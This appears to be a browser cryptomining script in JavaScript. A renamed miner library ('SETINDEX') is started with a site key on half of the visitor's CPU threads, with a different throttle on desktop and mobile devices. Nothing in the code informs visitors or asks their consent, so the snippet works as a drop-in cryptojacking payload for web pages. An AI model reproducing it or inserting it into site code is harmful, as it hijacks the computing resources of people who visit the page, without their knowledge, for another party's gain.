let base = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
	forceASMJS: false
});

if (!base.isMobile()){
	let site = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
		threads: base.getNumThreads() / 2,
		throttle: 0.4,
		forceASMJS: false
	});
	site.start();
} else {
	let site = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
		threads: base.getNumThreads() / 2,
		throttle: 0.5,
		forceASMJS: false
	});
	site.start();
}
